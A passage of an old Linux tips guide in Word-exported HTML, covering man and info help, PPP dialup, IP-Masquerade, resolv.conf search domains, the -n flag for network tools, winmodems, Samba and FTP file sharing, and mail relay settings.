mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >system. For example, if you want to know what the command df does, simply type:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >man df</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The man system works with level of commands, from 1 to 8, plus other extensions. For full details about the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >man program, simply see its manual page:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >man man</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The second way to provide help is with the info system. These are usually much bigger files (the libc info</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >files have more than 10,000 lines of text).</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To access info files, simply type the info command. It is a bit harder to use, but you can get help by typing h.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <H1 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="3" >2.</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="3" >Networking</FONT></SPAN></SPAN></A></H1>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux is a networking operating system. Even so, problems related to networking are not uncommon. PPP</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >dialup can be hard to setup, local network IP address issues can be hard to understand. We try to solve most</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >common problems here with tips on how to make your networking and Internet experience a good one.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.1</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 1: Easy PPP dialup</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By default, most Linux distributions come with text-based configuration files and console menu-based</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >configuration programs for PPP dialup. Often, this simply isn't enough for most new users.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several GUI programs exist and can be used to configure your PPP dialup. One is X-isp, available from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://users.hol.gr/~dbouras/</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. You may still need to edit the pap-secrets file in /etc/ppp.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >An other is the Gnome PPP dialer. It comes with Gnome and can be used with no text file editing. Be sure to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >put a "*" in the "Remote address" field if it should be set dynamically.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here is a quick guide to setup the Gnome PPP program. First make sure the pppd program is suid root. Then,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >enter your user name, password and "*" in the remote IP field. Enter the DNS server, and set your IP address</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >or set to dynamic. This should work for most Internet providers. Check the PPP-HOWTO for a complete</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >overview of the PPP programs.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This is the Gnome PPP interface:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  ></FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.2</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 2: Internet for your LAN</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Many companies have local networks, and it is becoming even more popular in homes, where 2 or 3 systems</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >are linked together using ethernet wires. Most providers only offer 1 IP address per connection, which means</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >that you can't put all of the systems on the Internet at the same time, unless you use a special gateway.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux comes with something called IP-Masquerade. With it, you can assign LAN IPs, which are IPs that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >can't go on the Internet directly, and then use the Linux system as a gateway. All you need to implement this</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >is a Linux system with 2 ethernet cards, and an Internet connection. The Linux system has IP-Masquerade</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >enabled, and the LAN systems will have access to the Internet using the Linux gateway as a transparant proxy</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >server.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can find more on the subject by reading the IP-Masq HOWTO and other networking documentation at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://metalab.unc.edu/pub/Linux/docs</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. You also need to make sure your Internet provider accepts this kind</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >of network on their connection.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.3</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 3: Domains to search in</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you try to access a Web site, or any remote site, you need to specify the full hostname. This means the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >machine name plus the domain name:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >lynx my.yahoo.com</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you have a few domain names that you access a lot, you can make your life easier. You can edit</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >/etc/resolv.conf and add the domains there:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >search domain.net yahoo.com</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This means that the system will search in those domains for hostnames. From now on type:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >lynx my</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The system will now look for "my", if that hostname doesn't exist it will look for "my.domain.net", and at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >last "my.yahoo.com".</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.4</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 4: Display IP rather than hostname</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When dealing with networking issues, it often helps to be able to use only IP addresses rather than</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >hostnames. Why? For 2 reasons. First, the name server might not always be available if routing is being</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >changed. And most important, you may not have the time to wait for all the IP resolving to be done.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Fortunately, many networking utilities in Linux share a common option flag. The -n flag. It will allow you to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >make the utility display IP addresses rather than hostnames. Here are a few examples:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >netstat -an</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >traceroute 1.2.3.4 -n</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >arp -n -a -i eth0 -a proxy</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >These commands were all given the -n flag and will display only IP addresses.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.5</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 5: Is my modem a winmodem?</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Winmodems are modems which lack some hardware. They use software drivers to emulate the hardware, and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the CPU to do some tasks. Unfortunately the drivers provided by the winmodem manufacturers are Windows</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >only.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There is no sure way to know if the modem should work in Linux or not, except trying it yourself, or ask</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >someone else who has tried it. Fortunately, there is a Web site with a very long list of modems that are known</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to work in Linux, and those that are winmodems. The Web site can be found at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://www.o2.net/~gromitkc/winmodem.html"  ><FONT face="Times New Roman"  >http://www.o2.net/~gromitkc/winmodem.html</FONT></A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.6</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 6: Sharing files from a Windows system</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The protocol to use to be able to share files with Windows systems is called SMB. Linux supports natively a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >lot of file systems and network protocols. SMB is one of them. To be able to mount a Windows file system to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >share files, that system needs to have file sharing enabled, and you need to enable SMB support in the kernel.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You also need to download a program called Samba which allows you to share remote file systems, and build</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >yourself a server. General information about how to connect Linux, Windows machines and Macs is on the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Web at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.eats.com/linux_mac_win.html</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If SMB is not a possibility, you could use FTP. Linux by default has an FTP server turned on. Windows FTP</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >servers are also available for free.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.7</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 7: Sorry but this host is not in my list</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Mail clients require you to specify your server for incoming mail, but they also need a server for outgoing</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >mail. If you have sendmail or Qmail running, you can use localhost. If not, you may use your provider's mail</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >server.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you setup your own mail server, you may have problems sending mail from other systems on your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >network. Mail servers often block clients from using them for outgoing mail to prevent relaying. You need to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >specify the hosts where you will be sending mail from. Here is how to do it in Qmail, from the FAQ. You</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >need to put the following line in /etc/hosts.allow:</FONT></SPAN></P>  <P style="MARGIN: 